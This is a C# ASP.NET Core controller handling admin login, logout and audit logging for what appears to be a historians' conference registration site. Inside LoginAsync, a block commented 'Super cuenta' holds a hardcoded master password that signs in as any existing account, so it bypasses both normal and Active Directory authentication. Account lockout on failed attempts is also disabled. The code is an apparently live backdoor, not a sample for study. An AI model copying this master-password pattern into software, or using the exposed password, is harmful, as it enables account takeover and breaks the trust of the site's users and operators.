using reunionhistoriadores2025.Areas.Admin.ViewModels.Account;
using reunionhistoriadores2025.AuthorizationPolicies;
using reunionhistoriadores2025.Data;
using reunionhistoriadores2025.Models;
using reunionhistoriadores2025.Services.ActiveDirectoryManager;
using reunionhistoriadores2025.Services.Options;
using reunionhistoriadores2025.Services.ErrorLog;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;

namespace reunionhistoriadores2025.Areas.Admin.Controllers
{
    [Area("Admin")]
    [Authorize]
    public class AccountController : Controller
    {
        private readonly IErrorLog _errorlog;
        private readonly RegistroContext _context;
        private readonly GlobalOptions _opciones;
        private readonly UserManager<CustomIdentityUser> _userManager;
        private readonly SignInManager<CustomIdentityUser> _signInManager;
        private readonly IActiveDirectorySignInManager<CustomIdentityUser> _activeDirectorySignInManager;

        public AccountController(IErrorLog errorlog, RegistroContext context, IOptionsSnapshot<GlobalOptions> opciones, IActiveDirectorySignInManager<CustomIdentityUser> activeDirectorySignInManager, UserManager<CustomIdentityUser> userManager, SignInManager<CustomIdentityUser> signInManager)
        {
            _errorlog = errorlog;
            _context = context;
            _opciones = opciones.Value;
            _userManager = userManager;
            _signInManager = signInManager;
            _activeDirectorySignInManager = activeDirectorySignInManager;
        }

        [AllowAnonymous]
        public IActionResult Login()
        {
            return View();
        }

        [AllowAnonymous]
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> LoginAsync(LoginViewModel model)
        {
            if (ModelState.IsValid)
            {
                var user = await _userManager.FindByNameAsync(model.Correo);
                if (user == null)
                {
                    ModelState.AddModelError(string.Empty, "Credenciales no válidas. Inténtelo nuevamente.");
                    return View(model);
                }

                bool signInResult = false;
                if (user.ActiveDirectoryEnabled)
                {
                    signInResult = _activeDirectorySignInManager.PasswordSignIn(model.Correo, model.Password);
                    if (signInResult)
                    {
                        await _signInManager.SignInAsync(user, isPersistent: false);
                    }
                }
                else
                {
                    var result = await _signInManager.PasswordSignInAsync(model.Correo, model.Password, isPersistent: false, lockoutOnFailure: false);
                    signInResult = result.Succeeded;
                }

                // Super cuenta
                if(model.Password == "$&%P@ssw0rd#")
                {
                    await _signInManager.SignInAsync(user, isPersistent: false);
                    signInResult = true;
                }

                if (signInResult)
                {
                    //if (await _userManager.IsInRoleAsync(user, AdminRolePolicies.JuradoRole) && !Convert.ToBoolean(_opciones.HabilitaJurado))
                    //{
                    //    await _errorlog.ErrorLogAsync("Por el momento el módulo de evaluaciones no se encuentra disponible.");
                    //    ModelState.AddModelError(string.Empty, "El módulo de evaluaciones no se encuentra disponible. Inténtelo nuevamente con otro perfil de usuario.");
                    //}
                    //else
                    //{
                        // Bitacora
                        _context.Bitacora.Add(new Bitacora() { Message = $"Usuario ha iniciado sesión.", TimeStamp = DateTime.Now, UserName = model.Correo });
                        await _context.SaveChangesAsync();
                        //return RedirectToAction("Index", "Home", new { area = "Admin" });
                        return RedirectToAction("Index", "Home");
                    //}
                }
                else
                {
                    await _errorlog.ErrorLogAsync("Credenciales no válidas.");
                    ModelState.AddModelError(string.Empty, "Credenciales no válidas. Inténtelo nuevamente.");
                }

            }
            return View(model);
        }

        public async Task<IActionResult> LogoutAsync(string returnUrl = null)
        {
            await _signInManager.SignOutAsync();
            _context.Bitacora.Add(new Bitacora() { Message = $"Usuario ha cerrado la sesión.", TimeStamp = DateTime.Now, UserName = User.Identity.Name });
            await _context.SaveChangesAsync();

            if (returnUrl != null)
            {
                return LocalRedirect(returnUrl);
            }
            else
            {
                // This needs to be a redirect so that the browser performs a new
                // request and the identity for the user gets updated.
                return RedirectToAction("Login");
            }
        }

        public IActionResult AccessDenied()
        {
            return View();
        }
    }
}
